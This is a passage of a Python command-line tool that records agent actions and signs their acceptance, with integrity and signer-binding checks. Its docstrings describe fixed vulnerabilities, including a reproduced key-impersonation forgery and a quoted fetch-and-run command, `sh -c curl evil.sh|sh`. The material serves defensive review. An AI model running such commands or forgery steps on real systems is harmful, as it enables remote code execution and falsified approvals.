    w = lambda *args: wrun("--store", str(WSTORE), *args)
    subject_bytes = (ART / subject_hash).read_bytes()
    subj_file = OAIP / "subject.tmp"
    subj_file.write_bytes(subject_bytes)
    subj = w("blob", "add", str(subj_file)).stdout.strip()
    policy = OAIP / "policy.txt"
    if not policy.exists():
        policy.write_text("OAIP decision policy v0: accept requires a passing validation check.\n")
    pol = w("blob", "add", str(policy)).stdout.strip()
    checkfile = OAIP / "check.tmp"
    checkfile.write_text(check_cmd + "\n")
    transcript_file = OAIP / "transcript.tmp"
    transcript_file.write_bytes((ART / transcript_hash).read_bytes())
    # The subject blob is the claim's SUBJECT, and two claims can share one:
    # {predicate, execution, effects} excludes the check command and verdict, so
    # `--check true` and `--check false` over the same execution collide. A
    # rebuild that re-derived the acceptance edge by subject hash alone projected
    # this one signed warrant onto the FAILED claim too (2026-07-30 adversarial
    # review; §5 violation). So the linkage is made EXPLICIT at accept time: the
    # accepted claim's id rides in subject.note, INSIDE the signed body — rebuild
    # follows it instead of guessing by subject hash. Legacy records without the
    # note fall back to subject-hash matching restricted to supported claims.
    r = w("accept", "--subject", subj, "--under", pol,
          "--check", str(checkfile), "--verdict", "pass",
          "--transcript", str(transcript_file),
          "--reason", f"claim: {predicate}",
          "--note", f"oaip-claim:{a.claim}",
          "--actor", a.actor, "--key", str(WKEY))
    wid = r.stdout.strip()
    for f in (subj_file, checkfile, transcript_file):
        f.unlink(missing_ok=True)
    if len(wid) != 64:
        sys.exit(f"warrant filing failed: {r.stdout} {r.stderr}")
    # created_at is the warrant's OWN signed ts, read back from the store — not a
    # second reading of the clock. The projection row must be re-derivable from
    # the canonical layer alone (§5), and two clock reads can straddle a second
    # boundary: a rebuild that disagrees by one second is not "the same graph".
    env = json.loads((WSTORE / "records" / f"{wid}.json").read_text())
    wts = env["body"]["ts"]
    # BIND THE SIGNER TO THE ACTOR, in OAIP's own keyring, from the record that
    # was just filed. This is the fact `rebuild` will require before it derives an
    # acceptance edge (2026-07-30 review, F7/F3): without it, any self-generated
    # key claiming any actor id produced an edge, because Warrant reports an
    # unbound binding as a WARN by specification and exits 0.
    #
    # The key is read back out of the filed signature rather than assumed, so the
    # binding records what actually signed; when `init` captured the public half
    # it is cross-checked, and a mismatch is fatal — it would mean the store was
    # signed by a key this ledger does not custody.
    signed_key = next((s.get("key") for s in env.get("sigs", [])
                       if isinstance(s, dict) and s.get("actor") == a.actor), None)
    if not (isinstance(signed_key, str) and HEX64.match(signed_key)):
        sys.exit(f"filed warrant {wid[:12]} carries no signature by {a.actor}; "
                 "refusing to record an acceptance nothing signed")
    if PUBKEY.is_file() and PUBKEY.read_text().strip() != signed_key:
        sys.exit(f"filed warrant {wid[:12]} was signed by {signed_key[:12]}, "
                 f"not by this ledger's own key ({PUBKEY.read_text().strip()[:12]})")
    bind_actor(a.actor, signed_key)
    con.execute("INSERT INTO warrants(claim_id,warrant_id,created_at) VALUES (?,?,?)",
                (a.claim, wid, wts))
    con.commit()
    print(f"ACCEPTED -> warrant {wid}\n  (signed, hash-addressed, cites the provenance as evidence "
          f"and the validation as a cmd@v1 check)")


def cmd_bind(a):
    """Record in OAIP's keyring that a key may sign as an actor.

    `cmd_accept` does this automatically for every acceptance it files, so a
    ledger used through `oaip accept`/`oaip do` never needs this command. It
    exists for two honest cases: a store created BEFORE OAIP had a keyring (whose
    acceptances would otherwise stop producing edges at the next rebuild, because
    nothing vouches for their signer), and an acceptance filed through the Warrant
    CLI directly. Naming the key is the operator's assertion, not OAIP's
    discovery — which is why it is a separate, explicit verb."""
    key = a.key
    if key is None:
        if not PUBKEY.is_file():
            sys.exit(f"no {PUBKEY}: this ledger does not know its own public key "
                     "(it predates `init` recording it) — pass --key <hex64>, "
                     "e.g. the `key` field of a signature in "
                     f"{WSTORE / 'records'}")
        key = PUBKEY.read_text().strip()
    if not (isinstance(key, str) and HEX64.match(key)):
        sys.exit("--key must be a 64-hex-character Ed25519 public key")
    bind_actor(a.actor, key)
    print(f"bound key {key[:12]} -> actor {a.actor}  ({TRUST})")


def cmd_do(a):
    """One-shot: intent → run → validate → accept-if-pass. The ergonomic verb —
    an agent action becomes a signed decision only if its validation check
    passes, in a single command (SPEC §4)."""
    from argparse import Namespace
    i = cmd_intent(Namespace(description=a.intent, parent=None))
    eid = cmd_run(Namespace(intent=i, command=a.command))
    cid, supported = cmd_claim(Namespace(execution=eid, predicate=(a.predicate or a.intent),
                                         check=a.check))
    if supported:
        cmd_accept(Namespace(claim=cid, actor=a.actor))
    else:
        print("NOT accepted — validation check failed "
              "(execution success is not acceptance; no warrant filed)")
        sys.exit(1)


def cmd_log(_):
    con = db()
    for i in con.execute("SELECT id,description FROM intents ORDER BY id"):
        print(f"INTENT {i[0]}  {i[1]}")
        for e in con.execute("SELECT id,command,exit_code,effects_n FROM "
                             "(SELECT e.id,e.command,e.exit_code,COUNT(f.id) effects_n "
                             " FROM executions e LEFT JOIN effects f ON f.execution_id=e.id "
                             " WHERE e.intent_id=? GROUP BY e.id)", (i[0],)):
            print(f"  EXEC {e[0]}  `{e[1]}`  exit={e[2]}  effects={e[3]}")
            for c in con.execute("SELECT id,predicate,supported FROM claims WHERE execution_id=?", (e[0],)):
                sup = "supported" if c[2] else "unsupported"
                print(f"    CLAIM {c[0]}  {c[1]}  [{sup}]")
                for wr in con.execute("SELECT warrant_id FROM warrants WHERE claim_id=?", (c[0],)):
                    print(f"      WARRANT {wr[0][:16]}…  (signed decision)")


def read_warrant_store():
    """(accepts, record_files, errors) over the decision half of the canonical layer.

    Every accept is returned as a dict carrying its subject hash, WarrantID, ts,
    subject note AND ITS ENVELOPE — the envelope, because the signatures are what
    `signer_gate` has to inspect, and re-reading the file later would be a second
    observation of a mutable directory.

    Integrity-checked before anything is derived from it, for the reason
    `read_artifact` gives about the artifact half: a record whose body does not
    hash to its own filename is not that record. Address-matching is NOT
    verification, though — see the three layers named in `cmd_rebuild`."""
    accepts, errors = [], []
    wrec_dir = WSTORE / "records"
    files = sorted(wrec_dir.glob("*.json")) if wrec_dir.is_dir() else []
    for path in files:
        if not HEX64.match(path.stem):
            # Not forged — not a record at all. A stray notes.json used to be
            # reported as "does not match its own address", misdiagnosing a
            # benign file as a forgery. Say what it is, precisely.
            errors.append(f"warrant store: stray file {path.name} in records/ — "
                          "its name is not a record address; remove it (the "
                          "Warrant store treats every records/*.json as a record)")
            continue
        try:
            doc = loads_ijson(path.read_bytes())
        except ValueError as e:
            errors.append(f"warrant {path.stem[:12]}: unreadable record: {e}")
            continue
        body = doc.get("body") if isinstance(doc, dict) else None
        if not isinstance(body, dict):
            # A crafted non-dict body at a valid address used to crash this
            # function with an AttributeError; a refusal is a decision, a
            # traceback is an accident.
            errors.append(f"warrant {path.stem[:12]}: envelope has no body object "
                          "— not a warrant record")
            continue
        if sha256(canon(body)) != path.stem:
            errors.append(f"warrant {path.stem[:12]}: body hashes to "
                          f"{sha256(canon(body))[:12]} — record does not match "
                          "its own address")
            continue
        if body.get("decision") == "accept":
            subj = body.get("subject") if isinstance(body.get("subject"), dict) else {}
            accepts.append({"subject": subj.get("hash"), "wid": path.stem,
                            "ts": body.get("ts"),
                            "note": subj.get("note") if isinstance(subj.get("note"), str) else "",
                            "env": doc})
    return accepts, files, errors


def signer_gate(report, actors, unbound_prefixes):
    """Return `refuse(wid, env) -> reason|None`: does this record's signature
    establish WHO accepted?

    THE DEFECT THIS CLOSES (F7/F3, 2026-07-30, second adversarial round). The
    previous gate was `warrant verify` exiting 0, and Warrant exits 0 for a
    cryptographically valid signature whose key nobody vouches for — by
    specification (§5: report the binding as unverified; §5.1: "Bound/unbound is
    a report"). Reproduced end to end on this branch before this function:

        warrant keygen --out attacker.key
        warrant --store .oaip/warrants accept --subject <a real claim's subject> \\
                --note oaip-claim:<that claim's id> --actor tester@local \\
                --key attacker.key
        oaip rebuild   ->  warrant=1
        oaip log       ->  WARRANT 41d32da62a81…  (signed decision)

    for a claim NOBODY accepted, with the actor `tester@local` freely
    impersonated. Three conditions must now hold, and each covers a way the other
    two can be evaded:
      * no signature on the record was EXCLUDED or malformed in Warrant's report
        — otherwise OAIP cannot tell which of several signatures was the valid
        one, and a bound-but-junk entry could stand next to an unbound-but-valid
        one (§5 lets anyone with store write access append co-signatures);
      * every signature entry names a key bound to the actor it claims in
        `.oaip/trust.json` — the ENFORCED rule, OAIP's own, because Warrant has
        none to enforce; and
      * Warrant's settlement grade does not itself call the record unbound
        against that same keyring file — corroboration, not the primary check.
    """
    per_record = findings_by_record(report) if report else {}

    def refuse(wid, env):
        amb = [m for m in per_record.get(wid, [])
               if any(k in m for k in _AMBIGUOUS_SIG)]
        if amb:
            return f"Warrant excluded or could not read a signature on it ({amb[0]})"
        reasons = unbound_signers(env, actors)
        if reasons:
            return reasons[0]
        if unbound_prefixes and wid[:12] in unbound_prefixes:
            return (f"Warrant's settlement grade reports it unbound against {TRUST}")
        return None

    return refuse


def cmd_rebuild(a):
    """Reconstruct the SQLite projection from the canonical layer alone (§5).

    The MUST this exists to make true: "Deleting the projection and rebuilding it
    from artifacts + warrants MUST yield the same graph." Until 2026-07-30 there
    was no way to attempt it, and the attempt would have failed -- the invocation,
    exit code, state snapshots and environment fingerprint lived only in rows.

    Reads ONLY the canonical layer -- .oaip/artifacts plus the Warrant store,
    which is exactly what §5 names ("artifacts + warrants"). If it needs the
    database to rebuild the database, the claim is circular and the check is
    worthless. The Warrant store half was missing until later on 2026-07-30:
    rebuild never repopulated the `warrants` table, so the claim→warrant
    ACCEPTANCE edge -- the one fact this protocol exists to record -- survived
    `do` and died at the first rebuild, and `oaip log` silently lost its
    WARRANT line. "The same graph" minus its most important edge is not the
    same graph.
    """
    allow_legacy = bool(getattr(a, "allow_legacy_links", False))
    # Read and validate the canonical layer BEFORE touching the projection. A
    # fail-closed check that deletes the database and then refuses to rebuild it
    # has destroyed the thing it was protecting.
    records = []
    bad = []
    for path in sorted(ART.glob("*")):
        # An artifact whose bytes do not hash to its address is not a record with
        # a problem, it is not that record at all. Rebuilding from it would
        # launder a forgery into the projection — which is exactly what happened
        # before this check existed.
        doc, err = read_artifact(path)
        if err:
            bad.append(err)
            continue
        if isinstance(doc, dict) and isinstance(doc.get("oaip_record"), str):
            records.append(doc)

    # The other half of the canonical layer: the Warrant store.
    accepts, wrec_files, store_bad = read_warrant_store()
    bad += store_bad

    # WHAT VERIFICATION MEANS HERE, IN THREE LAYERS THAT WERE EACH ADDED AFTER
    # THE PREVIOUS ONE WAS BROKEN BY REVIEW (2026-07-30, two rounds):
    #   1. address-matching (above) — satisfied BY CONSTRUCTION by anyone who can
    #      write a file, so it establishes nothing about who decided.
    #   2. `warrant verify` exiting 0 — broken two ways: `WARRANT_CLI=/usr/bin/true`
    #      exits 0 having verified nothing (so the call is now an IDENTITY PROBE:
    #      the program must emit a parseable `warrant.verify-report@v0`), and a
    #      cryptographically valid signature by a key nobody vouches for still
    #      exits 0, because Warrant reports an unbound key↔actor binding as a WARN
    #      by SPECIFICATION (§5, §5.1).
    #   3. BINDING (this layer): the signer must be a key bound to the actor it
    #      claims in OAIP's own keyring, `.oaip/trust.json`, which only
    #      `cmd_accept`/`oaip bind` ever write. An accept signed by an unknown key
    #      gets NO EDGE, whatever Warrant's exit status says.
    report, unbound_prefixes, actors = None, None, {}
    if wrec_files:
        report, rerr = store_report()
        if rerr:
            bad.append(f"warrant store: {rerr}")
        elif report["errors"]:
            first = next((f"{f.get('subject','')[:12]} {f.get('message')}"
                          for f in report["findings"]
                          if isinstance(f, dict) and f.get("level") == "ERR"), "")
            bad.append("warrant store: `warrant verify` reported "
                       f"{report['errors']} error(s) — an unverified acceptance "
                       f"must not become an edge ({first})")
        else:
            actors, aerr = read_trust()
            if aerr:
                bad.append(f"warrant store: {aerr}")
            unbound_prefixes = unbound_by_warrant()

    if bad:
        for e in bad:
            print("ERR ", e, file=sys.stderr)
        sys.exit(f"refusing to rebuild: {len(bad)} corrupt artifact(s) in the "
                 "canonical layer — the projection would assert forged facts "
                 "(the existing projection has been left untouched)")

    if DB.exists():
        DB.unlink()
    con = db()
    con.executescript(SCHEMA)       # one schema definition, not a copy of it
    # Deterministic order: by timestamp then id, so a rebuild is reproducible and
    # two rebuilds of the same artifacts give the same projection.
    records.sort(key=lambda d: (d.get("ts", 0), d.get("id", "")))
    counts = {"intent@v1": 0, "execution@v1": 0, "claim@v1": 0}
    for d in records:
        kind = d["oaip_record"]
        if kind == "intent@v1":
            con.execute("INSERT OR REPLACE INTO intents(id,description,parent_id,created_at)"
                        " VALUES (?,?,?,?)", (d["id"], d.get("description"),
                                              d.get("parent"), d.get("ts")))
        elif kind == "execution@v1":
            con.execute("""INSERT OR REPLACE INTO executions(id,intent_id,command,exit_code,
                           before_tree,after_tree,env_fp,stdout_hash,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("intent"), d.get("command"), d.get("exit_code"),
                         d.get("before_tree"), d.get("after_tree"), d.get("env_fp"),
                         d.get("stdout"), d.get("ts")))
            for e in d.get("effects", []):
                cur = con.execute("""INSERT INTO effects(execution_id,path,status,
                                     before_blob,after_blob) VALUES (?,?,?,?,?)""",
                                  (d["id"], e.get("path"), e.get("status"),
                                   e.get("before"), e.get("after")))
                at = e.get("attribution") or {}
                if at:
                    con.execute("""INSERT INTO attributions(effect_id,cause,method,
                                   confidence_ppm) VALUES (?,?,?,?)""",
                                (cur.lastrowid, at.get("cause"), at.get("method"),
                                 at.get("confidence_ppm")))
        elif kind == "claim@v1":
            con.execute("""INSERT OR REPLACE INTO claims(id,execution_id,predicate,check_cmd,
                           check_exit,transcript_hash,subject_hash,supported,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("execution"), d.get("predicate"), d.get("check"),
                         d.get("check_exit"), d.get("transcript"), d.get("subject"),
                         1 if d.get("supported") else 0, d.get("ts")))
        else:
            continue
        counts[kind] = counts.get(kind, 0) + 1
    # The claim→warrant edge, from the store records validated AND verified
    # above. Sorted filename order is deterministic, so two rebuilds agree
    # (same property the ts/id sort gives the artifact records).
    #
    # THE LINK IS EXPLICIT, AND MANDATORY (2026-07-30 adversarial review, both
    # rounds). The claim subject {predicate, execution, effects} excludes the
    # check command and the verdict, so a `--check true` claim and a `--check
    # false` claim over the same execution have IDENTICAL subject hashes — and
    # deriving the edge by subject hash projected one real signed acceptance onto
    # the FAILED claim too, changing the graph across rebuild (§5 MUST
    # violation). Accepts carry the accepted claim's id in subject.note
    # ("oaip-claim:<id>", inside the signed body) and rebuild follows that.
    #
    # ROUND TWO: the fallback for note-less records was ATTACKER-SELECTABLE.
    # "Has no note" is the writer's choice, and `note.startswith("oaip-claim:")`
    # made even the prefix's LETTER CASE the writer's choice. Reproduced: two
    # accepts filed directly with this project's own real key, one with no note
    # and one noted `OAIP-CLAIM:<id>`, both took the fallback, both produced an
    # edge, and `oaip verify` reported 0 errors. So:
    #   * the prefix is matched case-insensitively — a case variant can no longer
    #     downgrade anything, it simply IS the explicit link; and
    #   * the fallback is OFF unless BOTH (a) the operator passes
    #     --allow-legacy-links, and (b) the record predates this store's note
    #     convention per `.oaip/store.json` (see note_convention_since) — a
    #     criterion stamped by `init`, which the filer of a record cannot choose.
    claims_by_id = {d["id"]: d for d in records
                    if d["oaip_record"] == "claim@v1" and d.get("id")}
    supported_by_subject = {}
    claim_subjects = set()
    for d in records:
        if d["oaip_record"] == "claim@v1" and d.get("subject"):
            claim_subjects.add(d["subject"])
            if d.get("supported"):
                supported_by_subject.setdefault(d["subject"], []).append(d["id"])
    cutoff = note_convention_since()
    counts["warrant@edge"] = 0

    def edge(cid, wid, wts):
        con.execute("INSERT INTO warrants(claim_id,warrant_id,created_at)"
                    " VALUES (?,?,?)", (cid, wid, wts))
        counts["warrant@edge"] += 1

    refuse_signer = signer_gate(report, actors, unbound_prefixes)

    for acc in accepts:
        subj_hash, wid, wts, note = (acc["subject"], acc["wid"], acc["ts"],
                                     acc["note"])
        # WHO ACCEPTED, before WHAT was accepted. An acceptance whose signer is
        # not bound to the actor it claims is not this actor's decision, however
        # well-formed the rest of the record is (F7).
        why = refuse_signer(wid, acc["env"])
        if why is not None:
            print(f"WARN  accept {wid[:12]}: {why} — the signer is NOT bound to "
                  "the actor it claims, so this is not that actor's decision; "
                  "no acceptance edge derived (`oaip bind --actor <id>` if the "
                  "key really is this ledger's)", file=sys.stderr)
            continue
        if note[:len(NOTE_PREFIX)].lower() == NOTE_PREFIX:
            cid = note[len(NOTE_PREFIX):]
            c = claims_by_id.get(cid)
            if c is None:
                print(f"WARN  accept {wid[:12]} names claim {cid} — no such "
                      "claim record in the canonical layer; edge not derived",
                      file=sys.stderr)
            elif c.get("subject") != subj_hash:
                print(f"WARN  accept {wid[:12]} names claim {cid} but the "
                      "warrant's subject is not that claim's subject; edge "
                      "not derived", file=sys.stderr)
            elif not c.get("supported"):
                print(f"WARN  accept {wid[:12]} names claim {cid} whose own "
                      "check FAILED; cmd_accept would refuse it, so rebuild "
                      "refuses the edge", file=sys.stderr)
            else:
                edge(cid, wid, wts)
        elif subj_hash not in claim_subjects:
            # Not an OAIP claim acceptance at all. A Warrant store legitimately
            # holds other decisions — root adoption, key rotation, anything the
            # operator files with the same CLI — and emitting a forgery-adjacent
            # warning about them on every rebuild was a false accusation, made
            # repeatedly (F14).
            pass
        elif not allow_legacy:
            print(f"WARN  accept {wid[:12]} is about an OAIP claim's subject but "
                  "carries no oaip-claim:<id> note, so WHICH claim it accepted "
                  "is not recorded — and the subject alone cannot say (two "
                  "claims with opposite verdicts over one execution share it). "
                  "No edge derived. Pass --allow-legacy-links to fall back to "
                  "subject-hash matching for records that predate the note "
                  "convention.", file=sys.stderr)
        elif cutoff is not None and not (isinstance(wts, int) and wts < cutoff):
            print(f"WARN  accept {wid[:12]} carries no oaip-claim:<id> note but "
                  f"was filed at ts={wts}, at or after this store began "
                  f"requiring one (ts={cutoff}, {STOREMETA}). It is not a legacy "
                  "record; --allow-legacy-links does not cover it and no edge is "
                  "derived.", file=sys.stderr)
        else:
            cids = supported_by_subject.get(subj_hash, [])
            print(f"WARN  --allow-legacy-links: accept {wid[:12]} carries no "
                  f"explicit claim link; GUESSING by subject hash -> "
                  f"{len(cids)} supported claim(s). This can attach one signed "
                  "acceptance to a claim its signer never accepted, because the "
                  "claim subject excludes the check command and the verdict. "
                  "Only records filed before "
                  + (f"ts={cutoff}" if cutoff is not None
                     else "this store had a format marker")
                  + " are eligible.", file=sys.stderr)
            for cid in cids:
                edge(cid, wid, wts)
    # Re-register the artifacts themselves, so the index over the canonical layer
    # is complete rather than only covering what the records referenced.
    for path in sorted(ART.glob("*")):
        con.execute("INSERT OR IGNORE INTO artifacts(hash,kind,size) VALUES (?,?,?)",
                    (path.name, "rebuilt", path.stat().st_size))
    con.commit()
    print("rebuilt projection from the canonical layer: "
          + ", ".join(f"{k.split('@')[0]}={v}" for k, v in sorted(counts.items())))


def verify_artifacts():
    """Every artifact's bytes must hash to its filename, and every record must be
    canonical I-JSON. Returns a list of errors.

    Also: every hash the projection CITES must resolve. A dangling citation means
    the projection asserts a fact whose evidence is absent — reporting the graph
    as intact then is the same mistake as trusting a filename.
    """
    errs = []
    if not ART.is_dir():
        return [f"no canonical layer at {ART}"]
    present = set()
    for path in sorted(ART.glob("*")):
        doc, err = read_artifact(path)
        if err:
            errs.append(err)
        else:
            present.add(path.name)

    if DB.is_file():
        con = db()
        con.row_factory = sqlite3.Row
        cited = []
        for row in con.execute("SELECT hash FROM artifacts"):
            cited.append(("artifacts.hash", row[0]))
        for row in con.execute("SELECT id,subject_hash,transcript_hash FROM claims"):
            cited.append((f"claim {row[0]}.subject", row[1]))
            cited.append((f"claim {row[0]}.transcript", row[2]))
        for where, h in cited:
            if h and h not in present:
                errs.append(f"{where} cites {h[:12]} — not resolvable in the "
                            "canonical layer")
    return errs


def cmd_verify(_):
    """Verify the canonical layer FIRST, then the decision layer.

    WHAT THIS USED TO DO, AND WHY IT WAS WRONG
    ------------------------------------------
    It shelled out to `warrant verify` on `.oaip/warrants` and printed the last
    line — nothing else. Not one byte of `.oaip/artifacts` was examined, though
    SPEC §5 calls that layer the truth. Demonstrated 2026-07-30: with all three
    canonical records forged (`command` rewritten to `sh -c curl evil.sh|sh`),
    `oaip verify` printed "0 errors" and exited 0. It was checking the store next
    door to the evidence — a real, adjacent, healthy thing — and reporting that
    as the health of this one.

    AND WHY IT WAS STILL WRONG AFTER THAT
    -------------------------------------
    It reported `warrant verify`'s last line, and `warrant verify` exits 0 for an
    acceptance signed by a key nobody vouches for — Warrant reports an unverified
    key↔actor binding as a WARN by SPECIFICATION (§5). So `oaip verify` printed
    "0 errors" for a store in which an attacker-generated key had accepted a claim
    as `tester@local` (2026-07-30, second review round). An acceptance whose signer
    is unknown is now an OAIP-level ERROR — for the accepts that claim to be
    OAIP's; a Warrant store may legitimately hold OTHER decisions (root adoption,
    key rotation) that this ledger has no business vouching for.
    """
    errs = verify_artifacts()
    for e in errs:
        print("ERR ", e)
    print(f"canonical layer: {len(errs)} error(s)" if errs
          else "canonical layer: every artifact matches its address")

    accepts, wrec_files, store_errs = read_warrant_store()
    report, rerr = store_report() if wrec_files else (None, None)
    for e in store_errs:
        print("ERR ", e)
    if rerr:
        print("ERR  decision layer: " + rerr)
    dec_errs = list(store_errs) + ([rerr] if rerr else [])
    if report:
        actors, aerr = read_trust()
        if aerr:
            print("ERR ", aerr)
            dec_errs.append(aerr)
        else:
            refuse_signer = signer_gate(report, actors, unbound_by_warrant())
            for acc in accepts:
                if not acc["note"].lower().startswith(NOTE_PREFIX):
                    continue        # not an OAIP claim acceptance; not ours to judge
                why = refuse_signer(acc["wid"], acc["env"])
                if why is not None:
                    msg = (f"accept {acc['wid'][:12]} claims an OAIP claim but its "
                           f"signer is not bound to the actor it claims: {why}")
                    print("ERR ", msg)
                    dec_errs.append(msg)
        print(f"decision layer:  {report['records']} records, "
              f"{report['errors'] + len(dec_errs)} error(s), "
              f"{report['warnings']} warning(s)"
              + ("" if report["errors"] == 0 else "  [Warrant]"))
    elif not wrec_files:
        print("decision layer:  (empty store)")
    sys.exit(1 if (errs or dec_errs
                   or (report and report["errors"])) else 0)


def cmd_conformance(a):
    """SPEC §1: every OAIP record MUST canonicalize (JCS, Warrant §4) to the pinned
    bytes and identity. Recompute canon over each vector and compare byte-exact."""
    doc = json.loads(Path(a.vectors).read_text(encoding="utf-8"))
    ok = 0
    total = 0
    for v in doc["records"]:
        total += 1
        got = canon(v["record"])
        good = got.hex() == v["canon_hex"] and sha256(got) == v["canon_sha256"]
        print(("OK  " if good else "FAIL"), v["name"], "" if good else f"got {sha256(got)[:12]}")
        ok += good

    # The negative half. An implementation that accepts everything passes every
    # positive vector, so agreement on well-formed records establishes nothing
    # about whether two implementations share a domain (SPEC §1).
    for v in doc.get("reject", []):
        total += 1
        raw = bytes.fromhex(v["bytes_hex"])
        try:
            loads_ijson(raw)
            rejected, why = False, "ACCEPTED — must be refused"
        except (ValueError, UnicodeDecodeError) as e:
            rejected, why = True, str(e)
        print(("OK  " if rejected else "FAIL"), f"reject/{v['class']}/{v['name']}",
              "" if rejected else why)
        ok += rejected

    tag = "ALL PASS" if ok == total else "FAILURES"
    print(f"\nOAIP-CONFORMANCE: {tag} ({ok}/{total})")
    sys.exit(0 if ok == total else 1)


def main():
    ap = argparse.ArgumentParser(prog="oaip", description=__doc__.splitlines()[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("init").set_defaults(fn=cmd_init)
    pi = sub.add_parser("intent"); pi.add_argument("description"); pi.add_argument("--parent"); pi.set_defaults(fn=cmd_intent)
    pr = sub.add_parser("run"); pr.add_argument("--intent"); pr.add_argument("command", nargs=argparse.REMAINDER); pr.set_defaults(fn=cmd_run)
    pc = sub.add_parser("claim"); pc.add_argument("--execution", required=True); pc.add_argument("--predicate", required=True); pc.add_argument("--check", required=True); pc.set_defaults(fn=cmd_claim)
    pa = sub.add_parser("accept"); pa.add_argument("--claim", required=True); pa.add_argument("--actor", required=True); pa.set_defaults(fn=cmd_accept)
    pb = sub.add_parser("bind", help="vouch that a key may sign as an actor "
                        "(rebuild derives no acceptance edge from an unbound signer)")
    pb.add_argument("--actor", required=True)
    pb.add_argument("--key", help="hex64 Ed25519 public key; defaults to this "
                    "ledger's own key")
    pb.set_defaults(fn=cmd_bind)
    pd = sub.add_parser("do", help="one-shot: intent -> run -> validate -> accept-if-pass")
    pd.add_argument("--intent", required=True); pd.add_argument("--check", required=True)
    pd.add_argument("--predicate"); pd.add_argument("--actor", required=True)
    pd.add_argument("command", nargs=argparse.REMAINDER); pd.set_defaults(fn=cmd_do)
    sub.add_parser("log").set_defaults(fn=cmd_log)
    prb = sub.add_parser("rebuild",
                         help="reconstruct the projection from artifacts (SPEC s5)")
    prb.add_argument("--allow-legacy-links", action="store_true",
                     help="for accepts filed BEFORE this store began requiring an "
                          "oaip-claim:<id> note, guess which claim was accepted "
                          "from the subject hash. Unsafe by construction: the "
                          "subject excludes the check command and the verdict, so "
                          "one signed acceptance can be attached to a claim its "
                          "signer never accepted")
    prb.set_defaults(fn=cmd_rebuild)
    sub.add_parser("verify").set_defaults(fn=cmd_verify)
    pf = sub.add_parser("conformance"); pf.add_argument("vectors", nargs="?", default="examples/vectors.json"); pf.set_defaults(fn=cmd_conformance)
    a = ap.parse_args()
    if a.cmd in ("run", "do") and a.command and a.command[0] == "--":
        a.command = a.command[1:]
    a.fn(a)


if __name__ == "__main__":
    main()
